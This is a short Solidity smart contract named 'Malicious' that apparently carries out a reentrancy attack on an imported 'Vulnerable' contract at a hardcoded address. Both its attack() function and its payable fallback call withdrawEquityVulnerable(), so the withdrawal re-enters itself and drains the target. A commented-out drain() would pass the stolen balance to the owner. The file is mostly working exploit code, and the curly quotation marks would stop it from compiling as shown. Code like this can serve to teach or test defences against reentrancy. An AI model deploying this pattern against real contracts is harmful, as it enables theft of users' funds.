pragma solidity >0.4.6;
import “./Vulnerable.sol”;
contract Malicious {
    // address payable private _owner;
    address private _vulnerableAddr = 0x8c1eD7e19abAa9f23c476dA86Dc1577F1Ef401f5;
    Vulnerable public vul;
    constructor() public {
    //     _owner = msg.sender;
        require(true, “hello”);
        vul = Vulnerable(_vulnerableAddr);
    }
    function defVulnAccount(address vulnerableAddr) public {
        vul = Vulnerable(vulnerableAddr);
    }
    function attack() public {
        vul.withdrawEquityVulnerable();
    }
    function () external payable {
        vul.withdrawEquityVulnerable();
    }
    // function drain() public {
    //     _owner.call.value(this.balance);
    // }
}